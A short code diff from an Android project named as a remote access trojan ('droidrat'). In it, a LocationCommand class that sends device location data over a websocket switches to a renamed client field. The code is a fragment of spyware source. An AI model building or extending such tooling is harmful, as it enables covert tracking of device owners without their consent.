@@ -8,7 +8,7 @@ import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
 import com.je_chen.droidrat_je.rat.modules.location.LocationGeocode;
 import com.je_chen.droidrat_je.rat.modules.location.LocationSystem;
 
-import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websockets;
+import static com.je_chen.droidrat_je.service.command.ProcessCommandService.droidRatWebSocketClient;
 
 
 public class LocationCommand extends CommandFather {
@@ -23,7 +23,7 @@ public class LocationCommand extends CommandFather {
 
     @Override
     public void send(String value) {
-        websockets.send(value);
+        droidRatWebSocketClient.send(value);
     }
 
     @Override
